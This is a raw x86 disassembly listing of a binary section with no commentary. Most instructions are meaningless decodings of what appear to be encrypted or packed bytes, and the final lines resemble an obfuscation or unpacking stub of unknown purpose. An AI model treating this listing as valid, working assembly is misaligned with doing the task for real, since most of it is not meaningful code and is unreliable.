  40309e:	(bad)  
  40309f:	pop    esp
  4030a0:	mov    ch,0x53
  4030a2:	out    0x72,eax
  4030a4:	scas   eax,DWORD PTR es:[edi]
  4030a5:	push   esi
  4030a6:	in     eax,0x6e
  4030a8:	rcr    DWORD PTR [edi],cl
  4030aa:	outs   dx,BYTE PTR ds:[esi]
  4030ab:	dec    ebx
  4030ac:	mov    dl,0x66
  4030ae:	add    DWORD PTR [esi-0x74],esi
  4030b1:	jmp    0x335421e9
  4030b6:	es push ecx
  4030b8:	out    0xf7,al
  4030ba:	mov    ds:0xf17d6f43,eax
  4030bf:	add    eax,0xc8db9b83
  4030c4:	test   DWORD PTR [ebx-0x22],ebp
  4030c7:	loopne 0x403099
  4030c9:	nop
  4030ca:	push   0xe7568871
  4030cf:	xor    BYTE PTR [ebx+0x49a03454],ch
  4030d5:	and    al,0x84
  4030d7:	test   DWORD PTR [ebx],edx
  4030d9:	mov    ebx,esp
  4030db:	daa    
  4030dc:	xchg   esp,eax
  4030dd:	and    BYTE PTR [ecx],dl
  4030df:	adc    DWORD PTR [ebx+0x1b632add],edx
  4030e5:	and    eax,0x63978d20
  4030ea:	add    edx,esp
  4030ec:	or     ch,BYTE PTR [edx]
  4030ee:	pop    esp
  4030ef:	push   edx
  4030f0:	test   DWORD PTR [ebx+ecx*2-0x3b],eax
  4030f4:	stc    
  4030f5:	xor    BYTE PTR [ebx-0x599db7b0],al
  4030fb:	out    0xaa,al
  4030fd:	call   0x5f773793
  403102:	in     al,0x65
  403104:	(bad)  
  403105:	jmp    0x9536fbdb
  40310a:	enter  0xee66,0xcf
  40310e:	sti    
  40310f:	test   al,0x6
  403111:	aam    0x62
  403113:	out    dx,eax
  403114:	mov    fs,ebp
  403116:	mov    dl,0xe9
  403118:	add    DWORD PTR [ebp-0x77],eax
  40311b:	push   edx
  40311c:	push   ebx
  40311d:	fcom   st(1)
  40311f:	(bad)  
  403120:	mov    ecx,ebx
  403122:	js     0x403129
  403124:	int3   
  403125:	and    al,0x96
  403127:	out    0x95,al
  403129:	xchg   esp,eax
  40312a:	in     al,0xf0
  40312c:	xor    DWORD PTR [edx-0x4a],edi
  40312f:	les    esp,FWORD PTR [edi-0xf]
  403132:	jmp    0x40315f
  403134:	mov    eax,0x9b96492c
  403139:	jnp    0x40315a
  40313b:	adc    DWORD PTR [ebx+0x27],edi
  40313e:	pop    es
  40313f:	mov    al,0x47
  403141:	sar    DWORD PTR [eax+0x76],0xf7
  403145:	mov    DWORD PTR [ebx+0x53a7fb33],edx
  40314b:	mov    ecx,0x78f9330f
  403150:	push   ebp
  403151:	or     eax,0x8af4abf6
  403156:	mov    edi,0x795aa370
  40315b:	jbe    0x403198
  40315d:	sub    ah,BYTE PTR [esi+0x7cd3865]
  403163:	ds scas al,BYTE PTR es:[edi]
  403165:	ds jle 0x4031e1
  403168:	test   BYTE PTR [esp+ecx*1-0x3b45b728],0x41
  403170:	or     eax,0x953e5030
  403175:	mov    al,0x88
  403177:	mov    al,cs:0xebc52eec
  40317d:	adc    DWORD PTR [ebx+0x7a],edi
  403180:	test   eax,0xf2b26634
  403185:	push   ebp
  403186:	mov    dl,BYTE PTR [edi+ecx*8+0x6b]
  40318a:	and    ebx,ebp
  40318c:	ds mov esi,0xa476bb0d
  403192:	sbb    BYTE PTR [eax],ah
  403194:	jl     0x4031d7
  403196:	dec    eax
  403197:	push   0x30747b1
  40319c:	dec    eax
  40319e:	pop    eax
  40319f:	mov    eax,ds:0x18161d1d
  4031a4:	mov    esp,ds
  4031a6:	xor    edi,DWORD PTR [ebp-0x15af49f1]
  4031ac:	aam    0xa0
  4031ae:	push   ebp
  4031af:	(bad)  
  4031b0:	sub    BYTE PTR [ecx+edx*8],bl
  4031b3:	js     0x403195
  4031b5:	push   edx
  4031b6:	jae    0x4031a6
  4031b8:	dec    esp
  4031b9:	cmp    DWORD PTR [ebp+0x21987b8],esp
  4031bf:	mov    bl,0xbc
  4031c1:	jns    0x403204
  4031c3:	inc    ebp
  4031c4:	inc    ebp
  4031c5:	(bad)  
  4031c6:	ds loope 0x403178
  4031c9:	inc    esp
  4031ca:	cld    
  4031cb:	xchg   edx,eax
  4031cc:	add    bl,BYTE PTR ds:0x77a356b4
  4031d2:	sub    al,0xe2
  4031d4:	loop   0x4031e3
  4031d6:	rcl    dl,1
  4031d8:	jno    0x4031d9
  4031da:	jge    0x4031b1
  4031dc:	lea    edx,[edi+esi*4-0x22]
  4031e0:	fstp   DWORD PTR [eax+0x56]
  4031e3:	cmp    edx,ecx
  4031e5:	(bad)  
  4031e6:	lods   al,BYTE PTR ds:[esi]
  4031e7:	dec    edi
  4031e8:	sbb    DWORD PTR [edx+0x35821d91],ebx
  4031ee:	std    
  4031ef:	stos   BYTE PTR es:[edi],al
  4031f0:	cmc    
  4031f1:	fimul  WORD PTR [ebp+0x41]
  4031f4:	sub    DWORD PTR [ebx+esi*2-0x704dce69],ecx
  4031fb:	push   edi
  4031fc:	fcmovnu st,st(0)
  4031fe:	stos   DWORD PTR es:[edi],eax
  4031ff:	ror    DWORD PTR [edx-0x65],cl
  403202:	sub    al,0x97
  403204:	rcl    BYTE PTR [edi+0x15],0xf3
  403208:	push   edi
  403209:	pop    esi
  40320a:	(bad)  
  40320b:	push   edx
  40320c:	mov    eax,ds:0x29af0fbb
  403211:	lock xchg ecx,eax
  403213:	xor    edx,DWORD PTR [ebp+0x556f175b]
  403219:	xor    DWORD PTR [ebx],esp
  40321b:	push   es
  40321c:	into   
  40321d:	jnp    0x40327a
  40321f:	fist   WORD PTR [ebp-0x2cd7a4ab]
  403225:	ror    BYTE PTR [eax+0x25],cl
  403228:	dec    esp
  403229:	adc    edi,0xc7fb41c
  40322f:	adc    eax,0x1a332b03
  403234:	sub    eax,0x63db7c46
  403239:	cmp    BYTE PTR [edi-0xb],cl
  40323c:	cmp    eax,0xc96931d9
  403241:	rcl    DWORD PTR [edx+eax*2+0x6c],0xce
  403246:	sahf   
  403247:	nop
  403248:	in     al,0x7f
  40324a:	(bad)  ds:0x9ccbe591
  403250:	or     al,0x8f
  403252:	mov    ch,0x6e
  403254:	mov    esp,0xe7a46b43
  403259:	imul   ebp,ebx,0x76
  40325c:	daa    
  40325d:	rol    BYTE PTR [edi+ecx*8+0x20],cl
  403261:	ret    0x4237
  403264:	pop    ebx
  403265:	repnz adc ebx,DWORD PTR [esi-0x5c]
  403269:	jae    0x4032de
  40326b:	imul   eax,DWORD PTR [ebp+0x72],0xfffffff3
  40326f:	mov    cl,0x3c
  403271:	xor    al,0x9e
  403273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403274:	mov    ds:0xe4d76bb8,al
  403279:	mov    al,0x93
  40327b:	mov    DWORD PTR [eax],ebp
  40327d:	fisub  WORD PTR [ecx-0x38b2a598]
  403283:	shl    dl,cl
  403285:	cmp    ebp,eax
  403287:	imul   esi,ebp,0x6
  40328a:	pminsw mm2,QWORD PTR [esi]
  40328d:	inc    edi
  40328e:	sbb    al,0x37
  403290:	je     0x40330b
  403292:	(bad)  
  403293:	call   0xcce1ee77
  403298:	dec    esp
  403299:	cld    
  40329a:	jp     0x4032eb
  40329c:	clc    
  40329d:	or     eax,0x7af9c33
  4032a2:	sub    al,0x92
  4032a4:	jb     0x40323a
  4032a6:	dec    esi
  4032a7:	push   ecx
  4032a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a9:	stos   BYTE PTR es:[edi],al
  4032aa:	cli    
  4032ab:	xor    ebp,DWORD PTR [ebp+0x5f]
  4032ae:	ja     0x403277
  4032b0:	popf   
  4032b1:	scas   eax,DWORD PTR es:[edi]
  4032b2:	lock stos DWORD PTR es:[edi],eax
  4032b4:	je     0x4032b5
  4032b6:	and    BYTE PTR [ecx+0x25],dh
  4032b9:	push   edi
  4032ba:	mov    bh,0xf8
  4032bc:	stos   DWORD PTR es:[edi],eax
  4032bd:	test   BYTE PTR [ebp-0x79],0x76
  4032c1:	or     DWORD PTR [edx+0x8d35672],ebx
  4032c7:	fistp  DWORD PTR [ecx]
  4032c9:	push   ecx
  4032ca:	loopne 0x4032e7
  4032cc:	pop    ecx
  4032cd:	lea    ebp,[ecx+0x3e]
  4032d0:	add    BYTE PTR [edx+0x5],dl
  4032d3:	sbb    DWORD PTR [eax],0x9e29eb2c
  4032d9:	inc    eax
  4032da:	cmp    DWORD PTR [ebx+ebp*2-0x2d5aad3b],esp
  4032e1:	adc    ecx,esp
  4032e3:	loop   0x40329c
  4032e5:	mov    esi,0x15f44d3e
  4032ea:	lahf   
  4032eb:	(bad)  
  4032ed:	repnz sub dh,dl
  4032f0:	adc    ecx,DWORD PTR [esi+0x36]
  4032f3:	sbb    edi,DWORD PTR [edi-0x3a]
  4032f6:	xor    ebp,ebx
  4032f8:	mov    dh,0x3b
  4032fa:	add    edi,esp
  4032fc:	leave  
  4032fd:	popf   
  4032fe:	arpl   ax,sp
  403300:	popaw  
  403302:	push   eax
  403303:	and    ebx,ebx
  403305:	dec    edx
  403306:	or     BYTE PTR [ebx+0x51a6ca53],al
  40330c:	add    eax,DWORD PTR [edx+ebx*1]
  40330f:	and    bl,BYTE PTR [esi]
  403311:	retf   
  403312:	loopne 0x4032e1
  403314:	rcr    DWORD PTR [edx+0x50],cl
  403317:	(bad)  
  403318:	cmp    al,0xd5
  40331a:	out    0xb6,eax
  40331c:	dec    eax
  40331d:	jle    0x4032a7
  40331f:	or     bh,BYTE PTR [edx+0x66a30599]
  403325:	xchg   ebx,eax
  403326:	shr    BYTE PTR [eax-0x66],0x7b
  40332a:	mov    WORD PTR [edx+0x26],fs
  40332d:	(bad)  [edi+0x4a67b3a0]
  403333:	pop    edx
  403334:	cs push ss
  403336:	mov    ebp,0x6350d094
  40333b:	pop    edx
  40333c:	cmova  esi,DWORD PTR [edx]
  40333f:	jae    0x40338e
  403341:	cmp    al,0xfe
  403343:	imul   edi,esi,0xffffffea
  403346:	mov    ds:0x1c4c81c5,al
  40334b:	in     eax,0x37
  40334d:	pushf  
  40334e:	add    BYTE PTR [eax+0x29],0x29
  403352:	dec    ecx
  403353:	pop    DWORD PTR [edi-0x70f65ede]
  403359:	repnz push ecx
  40335b:	out    dx,al
  40335c:	leave  
  40335d:	pushf  
  40335e:	pop    esi
  40335f:	dec    esi
  403360:	mov    bh,BYTE PTR [edx+eiz*2]
  403363:	cmp    esi,edi
  403365:	mov    esp,0xceb7e863
  40336a:	arpl   bx,si
  40336c:	jne    0x403382
  40336e:	xchg   edi,eax
  40336f:	xchg   edx,eax
  403370:	xchg   esp,eax
  403371:	xchg   edx,eax
  403372:	icebp  
  403373:	jecxz  0x4033d4
  403375:	push   eax
  403376:	push   ebx
  403377:	inc    eax
  403378:	dec    ebp
  403379:	out    0x8a,al
  40337b:	mov    al,0xb4
  40337d:	mov    gs,WORD PTR [eax+0x296b5e47]
  403383:	and    al,0xb2
  403385:	cmc    
  403386:	mov    eax,0x177edddf
  40338b:	dec    edi
  40338c:	dec    ebp
  40338d:	je     0x403355
  40338f:	pop    eax
  403390:	sar    DWORD PTR [esi],cl
  403392:	jle    0x403373
  403394:	mov    eax,gs
  403396:	pop    es
  403397:	push   ss
  403398:	jns    0x40340e
  40339a:	jg     0x4033df
  40339c:	xchg   ebx,eax
  40339d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40339e:	add    eax,ebx
  4033a0:	out    dx,eax
  4033a1:	xchg   ch,ah
  4033a3:	repz or ebx,DWORD PTR [ebp+0x24]
  4033a7:	frstor [edi-0x62b8d6c2]
  4033ad:	jecxz  0x40336c
  4033af:	pop    edx
  4033b0:	ss aam 0xa
  4033b3:	dec    edi
  4033b4:	cmp    ah,dh
  4033b6:	shl    DWORD PTR [ebp*8+0x707c0fa5],1
  4033bd:	mov    dh,dl
  4033bf:	loop   0x4033b1
  4033c1:	mov    dh,0x14
  4033c3:	push   esi
  4033c4:	dec    ebx
  4033c5:	pop    ss
  4033c6:	sbb    ebp,DWORD PTR [ecx+0x3b935bc8]
  4033cc:	inc    ecx
  4033cd:	retf   0x4ab3
  4033d0:	sbb    eax,0x731ad22c
  4033d5:	int    0x19
  4033d7:	hlt    
  4033d8:	add    al,0x9e
  4033da:	jae    0x40342f
  4033dc:	xor    al,0x48
  4033de:	enter  0xfd03,0x86
  4033e2:	jnp    0x4033af
  4033e4:	push   ds
  4033e5:	stos   DWORD PTR es:[edi],eax
  4033e6:	fcmovne st,st(7)
  4033e8:	mov    ebp,0xc2c06670
  4033ed:	dec    eax
  4033ee:	inc    eax
  4033ef:	jecxz  0x403422
  4033f1:	fbld   TBYTE PTR [esp+ecx*2]
  4033f4:	into   
  4033f5:	clc    
  4033f6:	sbb    al,0x7f
  4033f8:	stc    
  4033f9:	add    ch,0x7c
  4033fc:	(bad)  [edx-0x58d61cc8]
  403402:	push   ecx
  403403:	rcr    BYTE PTR [ecx-0x1f951947],0x26
  40340a:	(bad)  
  40340b:	push   0xbb0d62d9
  403410:	sub    eax,0x7e21dbd1
  403415:	repnz push esp
  403417:	cmp    dh,BYTE PTR [esi]
  403419:	or     DWORD PTR [esi+0x6b3e0c43],edx
  40341f:	dec    edx
  403420:	inc    esp
  403421:	xor    BYTE PTR [ebx-0x53],ah
  403424:	repnz and cl,al
  403427:	sub    BYTE PTR [ebp-0x6d],0x2
  40342b:	jle    0x4033b7
  40342d:	test   BYTE PTR [eax+0x70],bl
  403430:	sbb    esp,ebp
  403432:	rcl    BYTE PTR [edx-0x5a],1
  403435:	pop    edx
  403436:	lea    ebx,[esi-0x5b388dc1]
  40343c:	push   ss
  40343d:	ins    DWORD PTR es:[edi],dx
  40343e:	push   es
  40343f:	or     ch,BYTE PTR [ebx+0x5de403e4]
  403445:	jmp    0x9534ccd0
  40344a:	inc    edi
  40344b:	or     al,0x21
  40344d:	xor    ebx,DWORD PTR [ebp-0x7dcc99bb]
  403453:	lock dec ebx
  403455:	xor    al,BYTE PTR [edi]
  403457:	loope  0x40345a
  403459:	mov    ch,0xd0
  40345b:	(bad)  
  40345c:	pop    ebx
  40345d:	cmp    BYTE PTR [ecx],bh
  40345f:	push   0xffffffe0
  403461:	jo     0x4034e2
  403463:	dec    edx
  403464:	add    BYTE PTR [ebx],bl
  403466:	jmp    0x55fc:0xf8575fee
  40346d:	xchg   ebp,eax
  40346e:	sbb    DWORD PTR [esi-0x15],edi
  403471:	mov    ecx,0xdefa79c
  403476:	jg     0x403451
  403478:	xchg   esp,eax
  403479:	in     al,dx
  40347a:	mov    dl,0x66
  40347c:	mov    ebp,0x28c4d2f9
  403481:	out    0xdd,al
  403483:	je     0x4034b8
  403485:	or     al,BYTE PTR [ebp-0x1c]
  403488:	pop    esp
  403489:	push   ebx
  40348a:	test   eax,0x88b5ca7
  40348f:	mov    edx,0x16fec25c
  403494:	rcr    DWORD PTR [esi+0x5a],0x92
  403498:	ins    BYTE PTR es:[edi],dx
  403499:	int    0xde
  40349b:	and    eax,0x24e9d4a5
  4034a0:	dec    ebx
  4034a1:	js     0x4034dc
  4034a3:	(bad)  
  4034a4:	push   edi
  4034a5:	mov    ?,ebp
  4034a7:	aam    0x3d
  4034a9:	pusha  
  4034aa:	push   es
  4034ab:	push   ebx
  4034ac:	and    eax,0x62a6a004
  4034b1:	jmp    0x27b:0xf545da18
  4034b8:	stos   DWORD PTR es:[edi],eax
  4034b9:	pushf  
  4034ba:	loopne 0x403453
  4034bc:	(bad)  
  4034bd:	out    dx,eax
  4034be:	xchg   esi,eax
  4034bf:	out    0x6a,al
  4034c1:	mov    dh,0xef
  4034c3:	sub    esi,0xffffffb8
  4034c6:	lea    ebp,ds:0xdda91248
  4034cc:	fidiv  DWORD PTR [ebp-0x34]
  4034cf:	xor    eax,0xd6f7f8b9
  4034d4:	(bad)  
  4034d5:	pop    esp
  4034d6:	loop   0x4034fb
  4034d8:	sbb    dl,BYTE PTR [ebp-0x1072f167]
  4034de:	push   0x55ff7f7b
  4034e3:	adc    eax,0x56607549
  4034e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e9:	ins    BYTE PTR es:[edi],dx
  4034ea:	sub    DWORD PTR [esi-0x31],ebx
  4034ed:	or     DWORD PTR [esi+0x37d56cec],ebx
  4034f3:	clc    
  4034f4:	mov    eax,ds:0xab18f6b6
  4034f9:	sahf   
  4034fa:	cld    
  4034fb:	cdq    
  4034fc:	pop    ecx
  4034fd:	mov    esp,0xa5aded5f
  403502:	mov    esi,0x3485e16a
  403507:	iret   
  403508:	std    
  403509:	sub    DWORD PTR [ecx],0x4f
  40350c:	adc    esi,edx
  40350e:	jge    0x403583
  403510:	pushf  
  403511:	fs xchg esp,eax
  403513:	and    BYTE PTR [edx],0x43
  403516:	(bad)  
  403517:	gs pop edx
  403519:	pop    edx
  40351a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351b:	scas   eax,DWORD PTR es:[edi]
  40351c:	shr    dh,0xe6
  40351f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403520:	cwde   
  403521:	dec    eax
  403522:	add    dl,BYTE PTR [eax+0x39]
  403525:	pusha  
  403526:	xchg   esp,eax
  403527:	cmp    esi,DWORD PTR [ebp+0xb626d3]
  40352d:	mov    dh,0xb6
  40352f:	mov    edi,0x34b9dcf1
  403534:	mov    ds:0x981a54e5,eax
  403539:	or     DWORD PTR es:[ecx],ecx
  40353c:	xchg   esp,eax
  40353d:	loop   0x403534
  40353f:	scas   al,BYTE PTR es:[edi]
  403540:	scas   al,BYTE PTR es:[edi]
  403541:	into   
  403542:	xchg   ebp,eax
  403543:	xrelease mov BYTE PTR ds:0x64df92af,ah
  40354a:	and    DWORD PTR [esi],0x1641106a
  403550:	test   DWORD PTR [esi],ebx
  403552:	push   0x40
  403554:	dec    edi
  403555:	xor    DWORD PTR [edi],ebp
  403557:	sub    eax,0x39fd5e57
  40355c:	sub    bh,BYTE PTR [edx-0x32]
  40355f:	inc    ecx
  403560:	popf   
  403561:	stos   DWORD PTR es:[edi],eax
  403562:	pop    edi
  403563:	mov    DWORD PTR [esi+ebx*1+0x20d01309],edx
  40356a:	cmp    al,0x90
  40356c:	push   ss
  40356d:	inc    edi
  40356e:	mov    eax,ds:0xb86fff0d
  403573:	rcr    edi,0xd1
  403576:	or     al,0x58
  403578:	popa   
  403579:	cmp    dl,0x4a
  40357c:	xchg   ebp,eax
  40357d:	mov    eax,ds:0x8decb61a
  403582:	imul   DWORD PTR [edi]
  403584:	jbe    0x4035cf
  403586:	push   0x931b7f3e
  40358b:	dec    edx
  40358c:	adc    BYTE PTR [edx+0x53cbd8fd],al
  403592:	out    dx,eax
  403593:	out    dx,eax
  403594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403595:	fstp   TBYTE PTR [ecx+0xdf15f4f]
  40359b:	jo     0x403601
  40359d:	mov    al,0xb3
  40359f:	ins    BYTE PTR es:[edi],dx
  4035a0:	mov    edi,0x4da3e5f0
  4035a5:	jno    0x403584
  4035a7:	lods   al,BYTE PTR ds:[esi]
  4035a8:	mov    ch,0x57
  4035aa:	test   DWORD PTR [ebx+0x1b],ecx
  4035ad:	mov    ds:0x8b1cedcc,eax
  4035b2:	lds    edi,FWORD PTR [esi+0x1303c442]
  4035b8:	push   0x77ace6c5
  4035bd:	mov    ecx,0xcaf5085a
  4035c2:	lock mov ds:0xadd5f752,eax
  4035c8:	lahf   
  4035c9:	cmp    eax,0x1e787d17
  4035ce:	inc    esp
  4035cf:	test   DWORD PTR [edi],esi
  4035d1:	nop
  4035d2:	sbb    edi,DWORD PTR [esp+edi*1]
  4035d5:	pop    esp
  4035d6:	mov    bl,0xbf
  4035d8:	mov    ch,0xa7
  4035da:	mov    eax,0x6e06209b
  4035df:	arpl   WORD PTR [ebx],dx
  4035e1:	push   eax
  4035e2:	xchg   ebx,edx
  4035e4:	and    eax,0xe6de5344
  4035e9:	imul   ecx,ecx,0x41
  4035ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ed:	push   esp
  4035ee:	ss pop eax
  4035f0:	fwait
  4035f1:	mov    al,0x6c
  4035f3:	jg     0x40365a
  4035f5:	enter  0x7614,0x32
  4035f9:	loopne 0x4035d6
  4035fb:	xchg   DWORD PTR [esi+0x4e],ebx
  4035fe:	jge    0x403644
  403600:	sbb    BYTE PTR [ecx-0x2d427024],ch
  403606:	int    0x10
  403608:	push   0xe55bd057
  40360d:	test   al,0x41
  40360f:	lods   eax,DWORD PTR ds:[esi]
  403610:	cli    
  403611:	xor    bl,ch
  403613:	adc    BYTE PTR [esi],0x95
  403616:	fs pop ebx
  403618:	push   edi
  403619:	mov    ebx,0xf45791a6
  40361e:	fadd   QWORD PTR [edx]
  403620:	(bad)  
  403621:	arpl   bx,di
  403623:	ja     0x202b2036
  403629:	ss adc cl,ch
  40362c:	jl     0x403693
  40362e:	xchg   ebx,eax
  40362f:	jl     0x403683
  403631:	ins    DWORD PTR es:[edi],dx
  403632:	psrlw  mm7,QWORD PTR [edi-0x67193d7c]
  403639:	cs jae 0x403688
  40363c:	sub    DWORD PTR [edx-0x38],eax
  40363f:	aas    
  403640:	sub    DWORD PTR [edi+eax*4],ecx
  403643:	leave  
  403644:	jl     0x4035eb
  403646:	xchg   edi,eax
  403647:	adc    BYTE PTR [ecx],dl
  403649:	out    0x17,al
  40364b:	hlt    
  40364c:	jge    0x40367f
  40364e:	les    esi,FWORD PTR [edi]
  403650:	sub    ah,BYTE PTR [edi+0x6]
  403653:	jmp    0x781e:0x1d6f161c
  40365a:	shl    esi,1
  40365c:	mov    ah,0xe4
  40365e:	jp     0x4035ff
  403660:	aad    0x10
  403662:	fs xor eax,0x5f7d5186
  403668:	mov    eax,ds:0x5cbf1657
  40366d:	aas    
  40366e:	addr16 dec eax
  403670:	inc    ebp
  403671:	call   0x9516a97a
  403676:	jne    0x403652
  403678:	push   edx
  403679:	test   eax,0x4b64d634
  40367e:	or     eax,0x245dc47f
  403683:	add    ecx,DWORD PTR [edx]
  403685:	test   BYTE PTR [edi-0x5d],cl
  403688:	fnstenv [edx+ebp*2+0x1206af84]
  40368f:	les    edi,FWORD PTR [ebx]
  403691:	cwde   
  403692:	scas   eax,DWORD PTR es:[edi]
  403693:	sbb    DWORD PTR [ebx+0x24],edx
  403696:	mov    WORD PTR [eax-0x4e],?
  403699:	sbb    al,0x52
  40369b:	pop    esp
  40369c:	dec    ebp
  40369d:	xchg   edx,eax
  40369e:	sbb    DWORD PTR [ebx+edx*4],ebp
  4036a1:	dec    ebx
  4036a2:	bound  esi,QWORD PTR [ebx-0x7]
  4036a5:	sbb    dl,al
  4036a7:	out    dx,al
  4036a8:	fsub   DWORD PTR [ebp+0x4e4a2446]
  4036ae:	sbb    esp,DWORD PTR [esi-0x22]
  4036b1:	and    DWORD PTR [esi-0x3b70b8fb],edx
  4036b7:	sbb    ecx,DWORD PTR [ebp+ebx*8+0x3ce5998c]
  4036be:	(bad)  
  4036bf:	imul   esp,DWORD PTR [eax+eiz*4-0x11],0x1e
  4036c4:	test   dh,0x80
  4036c7:	push   ebx
  4036c8:	std    
  4036c9:	inc    edx
  4036ca:	fnsave [ecx+0x61]
  4036cd:	jns    0x403679
  4036cf:	push   DWORD PTR [esi-0x4cb28613]
  4036d5:	cmp    ch,bh
  4036d7:	dec    edx
  4036d8:	inc    ebx
  4036d9:	icebp  
  4036da:	in     al,0x3f
  4036dc:	ja     0x40365f
  4036de:	mov    DWORD PTR [ebx+0x75749cbf],eax
  4036e4:	xor    al,0xe9
  4036e6:	jo     0x4036f9
  4036e8:	adc    ch,0x1d
  4036eb:	(bad)  
  4036ec:	jmp    0xd43:0x3a3886a9
  4036f3:	sbb    eax,0xe77dbc9b
  4036f8:	inc    ecx
  4036f9:	cli    
  4036fa:	in     eax,0xcc
  4036fc:	mov    ecx,0x47421052
  403701:	jb     0x403715
  403703:	hlt    
  403704:	mov    ecx,0x7acead74
  403709:	mov    al,0x84
  40370b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370c:	push   ecx
  40370d:	pushw  0xffea
  403710:	or     al,0x9c
  403712:	loope  0x4036cd
  403714:	or     al,BYTE PTR [ebp-0x1]
  403717:	stc    
  403718:	ret    
  403719:	fisubr DWORD PTR [ecx+0x28035d3b]
  40371f:	jmp    0xa962:0x332e7acb
  403726:	mov    ch,0x7e
  403728:	xchg   DWORD PTR [ecx+ebx*2],ecx
  40372b:	mov    esi,0x30c4f867
  403730:	dec    edx
  403731:	test   edx,0xdccf247
  403737:	enter  0x2a0b,0xba
  40373b:	hlt    
  40373c:	inc    edi
  40373d:	jge    0x40378a
  40373f:	scas   al,BYTE PTR es:[edi]
  403740:	(bad)  
  403741:	jg     0x4036c4
  403743:	icebp  
  403744:	or     eax,0xbca1e235
  403749:	and    ecx,DWORD PTR [ebx+eiz*8-0x3891cab]
  403750:	jecxz  0x40370c
  403752:	push   eax
  403753:	add    ah,dl
  403755:	add    eax,0xdaed05f3
  40375a:	fs dec esi
  40375c:	sub    BYTE PTR [eax-0x7f61a618],dl
  403762:	xchg   ecx,eax
  403763:	iret   
  403764:	aas    
  403765:	or     al,0xfe
  403767:	fcom   st(2)
  403769:	fld    st(0)
  40376b:	ins    BYTE PTR es:[edi],dx
  40376c:	xchg   ecx,eax
  40376d:	lods   al,BYTE PTR ds:[esi]
  40376e:	cwde   
  40376f:	jo     0x403742
  403771:	shr    BYTE PTR [eax+0x32],0x52
  403775:	cmp    edi,DWORD PTR ds:0xc616500c
  40377b:	xchg   ecx,eax
  40377c:	test   BYTE PTR [edi],dl
  40377e:	jno    0x40373f
  403780:	cld    
  403781:	mov    BYTE PTR [ebx-0x60],ah
  403784:	push   ss
  403785:	xor    al,0xf7
  403787:	shr    BYTE PTR [esi],0x25
  40378a:	pop    es
  40378b:	dec    ebx
  40378c:	sbb    ecx,ecx
  40378e:	add    DWORD PTR [esi],eax
  403790:	jle    0x4037c8
  403792:	sub    al,0xae
  403794:	add    ebx,DWORD PTR [esi-0xe]
  403797:	frstor [esi+edx*1]
  40379a:	sbb    edi,DWORD PTR [ebx-0x4c]
  40379d:	xchg   ebp,eax
  40379e:	adc    al,0x3f
  4037a0:	sub    eax,0xfaf19f2d
  4037a5:	fcomp  QWORD PTR fs:[eax+0x7aadf532]
  4037ac:	stc    
  4037ad:	adc    al,0x3d
  4037af:	sti    
  4037b0:	mov    ds:0xf44fb73d,eax
  4037b5:	and    esp,DWORD PTR [esi-0x23]
  4037b8:	dec    eax
  4037b9:	int3   
  4037ba:	jmp    0x609e:0xf474dead
  4037c1:	jb     0x403783
  4037c3:	inc    ebx
  4037c4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4037c6:	pop    ebx
  4037c7:	sub    eax,0x3c2d2b3b
  4037cd:	sub    ecx,DWORD PTR [ebx]
  4037cf:	div    BYTE PTR [esi-0x3a2197f]
  4037d5:	outs   dx,DWORD PTR ds:[esi]
  4037d6:	dec    esp
  4037d7:	cld    
  4037d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d9:	pop    ebx
  4037da:	shr    DWORD PTR [ebp+0x1fac576b],1
  4037e0:	push   edi
  4037e1:	pusha  
  4037e2:	aaa    
  4037e3:	div    BYTE PTR [edx-0x7e397772]
  4037e9:	cs ds into 
  4037ec:	(bad)  
  4037ed:	mov    ebx,0x3951d73d
  4037f2:	in     eax,dx
  4037f3:	pop    ss
  4037f4:	jo     0x403831
  4037f6:	pop    bp
  4037f8:	mov    esi,0xeac5b09a
  4037fd:	xchg   ebx,eax
  4037fe:	xchg   DWORD PTR [edi],esi
  403800:	add    BYTE PTR [eax],0x98
  403803:	jb     0x40387c
  403805:	push   0x2db81d6d
  40380a:	inc    ebx
  40380b:	push   esp
  40380c:	mov    BYTE PTR [edi+0xe],dh
  40380f:	and    eax,0xa53b65c
  403814:	sahf   
  403815:	and    ah,BYTE PTR [edx-0x5eddea25]
  40381b:	data16 int 0xe7
  40381e:	(bad)  
  40381f:	mov    ah,0x96
  403821:	arpl   WORD PTR [ebp+edi*2-0x2d],di
  403825:	fistp  WORD PTR [ebx]
  403827:	dec    ebp
  403828:	sar    DWORD PTR [edx],0xe0
  40382b:	test   ah,cl
  40382d:	mov    DWORD PTR [ebp-0x28],ecx
  403830:	sub    edx,DWORD PTR ds:0x42a426
  403836:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  40383d:	mov    edx,DWORD PTR ds:0x42a4da
  403843:	mov    edx,DWORD PTR [edx]
  403845:	xor    DWORD PTR ds:0x42a3ea,edx
  40384b:	mov    DWORD PTR [ebp-0x8],eax
  40384e:	mov    eax,DWORD PTR [ebp-0x10]
  403851:	neg    edx
  403853:	xor    eax,esi
  403855:	mov    edx,0xffcd8d91
  40385a:	sub    edx,eax
  40385c:	mov    eax,ds:0x42a44e
  403861:	mov    DWORD PTR [ebp-0xc],edx
  403864:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40386b:	mov    eax,DWORD PTR [ebp-0x8]
  40386e:	mov    DWORD PTR ds:0x42a41e,0x6d9f
  403878:	mov    DWORD PTR [ebp-0x3c],ebx
  40387b:	mov    DWORD PTR ds:0x42a3d6,0xb52
  403885:	cmp    eax,ecx
  403887:	mov    DWORD PTR ds:0x42a422,0x1900
  403891:	je     0x405f2a
  403897:	xor    DWORD PTR ds:0x42a406,edx
  40389d:	mov    eax,DWORD PTR [ebp-0x10]
  4038a0:	mov    ecx,DWORD PTR [ebp-0x10]
  4038a3:	sub    DWORD PTR ds:0x42a3b6,0x42a432
  4038ad:	xor    eax,esi
  4038af:	add    DWORD PTR ds:0x42a43a,0x138
  4038b9:	xor    ecx,esi
